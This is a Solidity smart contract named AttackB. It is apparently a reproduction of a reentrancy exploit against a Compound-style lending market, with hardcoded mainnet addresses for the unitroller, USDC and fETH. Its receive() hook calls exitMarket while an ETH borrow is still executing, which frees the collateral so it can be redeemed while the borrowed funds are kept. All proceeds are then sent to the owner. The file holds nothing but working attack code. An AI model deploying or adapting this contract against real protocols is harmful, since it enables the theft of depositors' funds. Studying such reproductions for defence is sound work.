// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "hardhat/console.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./interface.sol";

contract AttackB is Ownable {
  address constant unitrollerAddress = 0x3f2D1BC6D02522dbcdb216b2e75eDDdAFE04B16F;
  address constant usdcAddress = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
  address constant fETHAddress = 0x26267e41CeCa7C8E0f143554Af707336f27Fa051;
  address fTokenAddress;
  uint256 underlyingAmount;

  constructor() {}

  receive() external payable{
    IController(unitrollerAddress).exitMarket(fTokenAddress);
  }

  function setup(address _fTokenAddress) external onlyOwner {
    fTokenAddress = _fTokenAddress;
    address[] memory enterMarketList = new address[](1);
    enterMarketList[0] = _fTokenAddress;
    IController(unitrollerAddress).enterMarkets(enterMarketList);
  }

  function mint() external onlyOwner {
    IERC20 usdc = IERC20(usdcAddress);
    usdc.approve(fTokenAddress, type(uint).max);
    uint balanceOf = usdc.balanceOf(address(this));
    IFToken(fTokenAddress).mint(balanceOf);
    underlyingAmount = balanceOf;
  }

  function borrow(uint borrowAmount) external onlyOwner {
    IFToken(fETHAddress).borrow(borrowAmount);
  }

  function redeemAll() external onlyOwner {
    IERC20 usdc = IERC20(usdcAddress);

    IFToken(fTokenAddress).approve(fTokenAddress, type(uint256).max);
    IFToken(fTokenAddress).redeemUnderlying(underlyingAmount);

    // transfer all USDC and ETH
    usdc.transfer(msg.sender, usdc.balanceOf(address(this)));
    payable(msg.sender).transfer(address(this).balance);
  }
}
